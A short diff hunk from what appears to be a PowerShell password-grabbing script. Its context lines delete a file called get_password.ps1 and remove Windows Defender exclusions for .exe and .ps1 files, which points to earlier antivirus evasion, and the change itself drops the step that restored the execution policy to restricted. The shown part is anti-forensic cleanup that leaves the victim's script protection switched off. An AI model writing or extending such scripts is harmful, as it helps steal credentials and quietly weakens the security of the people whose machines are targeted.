@@ -28,8 +28,5 @@ Remove-Item get_password.ps1
 Remove-MpPreference -ExclusionExtension exe -Force
 Remove-MpPreference -ExclusionExtension ps1 -Force
 
-# Reset script blocker
-Set-ExecutionPolicy restricted -Force
-
 # bye
 exit
